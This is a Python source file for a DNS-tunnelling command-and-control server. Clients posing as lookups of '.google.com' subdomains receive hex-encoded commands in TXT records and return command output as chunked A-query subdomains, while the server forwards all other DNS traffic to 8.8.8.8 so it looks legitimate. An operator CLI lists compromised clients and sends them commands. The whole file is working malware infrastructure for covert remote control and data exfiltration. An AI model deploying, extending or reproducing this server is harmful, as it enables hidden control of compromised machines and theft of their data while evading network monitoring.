import socket
import threading
import re
import struct
import datetime
from   queue import Queue
import readline

# Dictionaries to keep track of clients action and interactions
clients          = {}
commands         = {}
chunks_received  = {}
message_received = {}
message_queue    = Queue()

# FLAGS
active_client         = None           # Current active client name
process_active_client = False          # True if a client interaction is active


default_timeout = 10                   # After X second the connections is considered timed-out

SERVER_IP           = "0.0.0.0"        # Listening local interface
SERVER_PORT         = 53               # Listening local port
DNS_IP              = "8.8.8.8"        # Real DNS server used to send legit queries
DNS_PORT            = 53               # Real DNS port
MALICIOUS_DOMAIN    = ".google.com"    # Malicious clients must use this domain to be identified by the server
MALICIOUS_DOMAIN_IP = "142.250.191.78" # IP that the server will use for malicious IP resolution
DEFAULT_TXT         = "70617373"       # 'pass' hex value (default message if there is not action provided for the client)

def encode_hex(message):
    return message.encode().hex()

def decode_hex(encoded_message):
    return bytes.fromhex(encoded_message).decode()

def thread_dns_receiver(sock):
    while True:
        data, addr = sock.recvfrom(512)
        threading.Thread(target=thread_dns_parser, args=(data, addr, sock)).start()

####################################
#                                  #
# Functions to handle DNS requests #
#                                  #
####################################
def thread_dns_parser(data, addr, sock):
    global active_client, process_active_client

    # Parse DNS packet
    domain_parts = []
    i = 12
    while True:
        length = data[i]
        if length == 0:
            break
        domain_parts.append(data[i+1:i+1+length].decode("utf-8"))
        i += length + 1
    qtype = struct.unpack('!H', data[i+1:i+3])[0] # Extract response type (A, TXT...)
    domain = ".".join(domain_parts)               # Extract domain

    # Handle malicious domain
    # For TXT request the domain must be:                 <client_name>.<domain>.<tld>
    # For A   request the domain must be: <message_chunk>.<client_name>.<domain>.<tld>
    if domain.endswith(MALICIOUS_DOMAIN):
        match = re.match(r".*(?:^|\.)([^\.]+)" + MALICIOUS_DOMAIN.replace(".", r"\.") + "$", domain)
        if match:

            client_name = match.group(1)

            # Update "last seen timestamp"
            current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            # Add new client to clients list
            if client_name not in clients:
                clients[client_name] = {
                    "ip": addr[0],
                    "last_seen": current_time
                }
                chunks_received[client_name] = []
                message_received[client_name] = ""
            clients[client_name]["last_seen"] = current_time

            if qtype == 16:  # "TXT" request
                # Send saved command or "pass" if no command was saved
                txt_record = commands.get(client_name, DEFAULT_TXT)
                response = create_txt_response(data, txt_record)
                sock.sendto(response, addr)

                # reset to default command
                commands[client_name] = DEFAULT_TXT

            elif qtype == 1:  # "A" request
                # Process A queries only if an interaction is active
                # and only if the interaction is enabled with the client    -> SECURITY REASONS AND FUTURE PROOF
                # sending the message
                if active_client == client_name and process_active_client:
                    handle_client_queries(client_name, domain, sock, addr, data)
                else:
                    response = create_a_response(data)
                    sock.sendto(response, addr)
            
            else:
                recursive_dns_request(data, addr, sock)
        else:
            response = create_error_response(data)
            sock.sendto(response, addr)
    else:
        recursive_dns_request(data, addr, sock)

# Handle type A queries to get output chunks
def handle_client_queries(client_name, domain, sock, addr, data):
    global active_client

    # Init dictionaries if client is not already registered
    if client_name not in chunks_received:
        chunks_received[client_name] = []
    if client_name not in message_received:
        message_received[client_name] = ""

    if domain == f"{client_name}{MALICIOUS_DOMAIN}":
        # Receiving a request A with only the client's name after receiving 
        # the chunks means that the message transmission is complete
        message_received[client_name] = "".join(chunks_received[client_name])  # Complete output
        chunks_received[client_name] = []  # Reset chunks for next output

        if active_client == client_name and process_active_client:
            # Process message chunks only if an interaction is active
            # and only if the interaction is enabled with the client    -> SECURITY REASONS AND FUTURE PROOF
            # sending the message
            try:
                decoded_message = decode_hex(message_received[client_name]) # Decode from hex
                message_queue.put(decoded_message)
            except Exception as e:
                print(f"Error decoding message from client {client_name}: {e}")
                message_queue.put(message_received[client_name])
    else:
        # Keeps adding chunks to chunks list until message
        # transmission is complete
        subdomain = domain.split('.')[0] 
        chunks_received[client_name].append(subdomain)

    response = create_a_response(data)
    sock.sendto(response, addr)

# Forward non-malicious DNS requests to a real server, then return the valid response to the client
def recursive_dns_request(data, client_addr, sock):
    try:
        remote_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        remote_sock.sendto(data, (DNS_IP, DNS_PORT))
        response, _ = remote_sock.recvfrom(512)
        sock.sendto(response, client_addr)
    except Exception as e:
        pass

##################################
#                                #
# Functions to craft DNS packets #
#                                #
##################################
# Sources:
# * https://datatracker.ietf.org/doc/html/rfc1034
# * https://datatracker.ietf.org/doc/html/rfc1035
# * https://mislove.org/teaching/cs4700/spring11/handouts/project1-primer.pdf
# * https://osqa-ask.wireshark.org/questions/50806/help-understanding-dns-packet-data/
# * https://stackoverflow.com/questions/60551698/how-a-domain-name-pointer-in-a-message-works-to-point-to-the-domain-name-in-a-dn
#########################################################

#########################################################
# DNS PACKET STRUCTURE
# - Header: Contains metadata about the query/response.
# - Question: Contains the query for the name server.
# - Answer: Provides answers to the question.
# - Authority: Not used in this project.
# - Additional: Not used in this project.
#########################################################

#########################################################
# DNS HEADER
# - ID: 16-bit identifier for queries, copied in responses.
# - QR: 1-bit field: 0 for query, 1 for response.
# - OPCODE: 4-bit field indicating the type of query.
# - AA: Authoritative Answer, meaningful in responses.
# - TC: TrunCation, indicates if the message was truncated.
# - RD: Recursion Desired, directs the server to pursue query 
#       recursively if set to 1.
# - RA: Recursion Available, set in responses to denote if 
#       recursive query support is available.
# - Z: Reserved for future use, set to 0.
# - RCODE: 4-bit field indicating response code:
#   - 0: No error condition.
#   - 1: Format error, server couldn't interpret query.
#   - 2: Server failure, server couldn't process the query.
#   - 3: Name Error, domain doesn't exist (from authoritative server).
#   - 4: Not Implemented, server doesn't support query type.
#   - 5: Refused, server refuses the operation for policy reasons.
# - QDCOUNT: Number of entries in the question section (usually 1).
# - ANCOUNT: Number of resource records in the answer section.
# - NSCOUNT: Number of name server resource records (set to 0).
# - ARCOUNT: Number of resource records in the additional section.
#########################################################

#########################################################
# DNS RESPONSE
# - QNAME: Domain name queried, sequence of labels.
# - QTYPE: 2-octet code specifying the type of query:
#   - 0x0001: A records (host addresses).
#   - 0x000f: MX records (mail servers).
#   - 0x0002: NS records (name servers).
# - QCLASS: 2-octet code specifying the class of the query.
#########################################################

#########################################################
# DNS ANSWER
# - NAME: Domain name queried, same format as QNAME.
# - TYPE: Specifies the meaning of RDATA:
#   - 0x0001: A record (IPv4 address).
#   - 0x0005: CNAME (alias).
#   - 0x0002: NS (name servers).
#   - 0x000f: MX (mail servers).
# - CLASS: Specifies the class of RDATA (0x0001 for IN, Internet).
# - TTL: Number of seconds the result can be cached.
# - RDLENGTH: Length of the RDATA field.
# - RDATA: Data of the response, format depends on TYPE:
#   - A record: 4-octet IPv4 address.
#   - CNAME: Name of the alias.
#   - NS: Name of the server.
#   - MX: 16-bit PREFERENCE and domain name for EXCHANGE.
#########################################################

# HEADERS
def create_response_header(query_data, rcode=0, qdcount=1, ancount=1, nscount=0, arcount=0):
    transaction_id = query_data[:2]
    flags   = struct.pack('!H', 0x8180 | rcode)
    qdcount = struct.pack('!H', qdcount)
    ancount = struct.pack('!H', ancount)
    nscount = struct.pack('!H', nscount)
    arcount = struct.pack('!H', arcount)
    return transaction_id + flags + qdcount + ancount + nscount + arcount

# TYPE A RESPONSES
def create_a_response(query_data): 
    header = create_response_header(query_data)
    query_section = query_data[12:]
    answer_section = (
        # '!HHHLH': Specifies the binary format (big-endian, 2 bytes, 2 bytes, 4 bytes, 2 bytes)
        # 0xc00c  : Pointer to the domain name in the original query => c0 indicates pointer, 0c pointer value(query_section=12)
        # 1       : Record type (1 = A, IPv4 address)
        # 1       : Record class (1 = IN, Internet)
        # 300     : TTL in seconds
        # 4       : Length of the response data (4 bytes for an IPv4 address)
        struct.pack('!HHHLH', 0xc00c, 1, 1, 300, 4) +
        socket.inet_aton(MALICIOUS_DOMAIN_IP)
    )
    return header + query_section + answer_section

# TYPE TXT RESPONSES
def create_txt_response(query_data, txt_record):
    header = create_response_header(query_data)
    query_section = query_data[12:]
    txt_len = len(txt_record)
    answer_section = (
        struct.pack('!HHHLH', 0xc00c, 16, 1, 300, txt_len + 1) +
        struct.pack('B', txt_len) + txt_record.encode()
    )
    return header + query_section + answer_section

# ERROR RESPONESES
def create_error_response(query_data):
    header = create_response_header(query_data, rcode=1, ancount=0)
    query_section = query_data[12:]
    return header + query_section

##########################
#                        #
# Command line interface #
#                        #
##########################
def cli():
    global active_client, process_active_client
    while True:
        cmd = input(">").strip().lower()
        
        if cmd == "":                                            # Empty input (ask again)
            continue

        if cmd == "clear":
            print("\033c", end="")                               # ANSI escape code to clean terminal
            continue

        readline.add_history(cmd)                                # Add command to commands history

        cmd = cmd.split(" ")

        if cmd[0] == "list":                                     # List connected clients
            for client, info in clients.items():
                print(f"* {client} ({info['ip']}) [{info['last_seen']}]")
        
        elif cmd[0] == "timeout" and len(cmd) == 2:              # Change connection timeout
            try:
                new_timeout = int(cmd[1])
                default_timeout = new_timeout
                print(f"Default timeout changed to {default_timeout} seconds for all clients.")
            except ValueError:
                print("Invalid timeout value. Please enter a valid number of seconds.")

        elif cmd[0] == "interact":                               # Start interacting with a specific client
            client_name = cmd[1]
            if client_name in clients:
                active_client = client_name
                process_active_client = True
                while True:
                    txt_record = input(f"{client_name}>").strip().lower()
                    
                    if txt_record == "":                         # Empty input (ask again)
                        continue

                    if txt_record == "clear":                    # ANSI escape code to clean terminal
                        print("\033c", end="")
                        continue

                    if txt_record == "exit":
                        active_client = None
                        process_active_client = False
                        break
                    
                    encoded_message = encode_hex(txt_record)     # Encode from string to hexadecimal
                    commands[client_name] = encoded_message
                    readline.add_history(encoded_message)        # Add command to commands history
                    
                    if client_name not in chunks_received:       # Init values for chunks and messages
                        chunks_received[client_name] = []
                    if client_name not in message_received:
                        message_received[client_name] = ""

                    try:
                        message = message_queue.get(timeout=30)  # Wait for the client to reply
                        print(message)
                    except:
                        print("No response received from client, timeout.")
            else:
                print("Unknown client")
        
        elif cmd[0] == "exit":
            print("Shutdown...")
            break
        
        else:
            print("Unknown command")

###############
#             #
# Main method #
#             #
###############
if __name__ == "__main__":
    print(f"DNS server listening on {SERVER_IP}:{SERVER_PORT}...")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((SERVER_IP, SERVER_PORT))

    # Start server DNS thread
    threading.Thread(target=thread_dns_receiver, args=(sock,), daemon=True).start()

    try:
        cli() # Start CLI interface
    except KeyboardInterrupt:
        print("\nDNS server shut down.")
    finally:
        sock.close()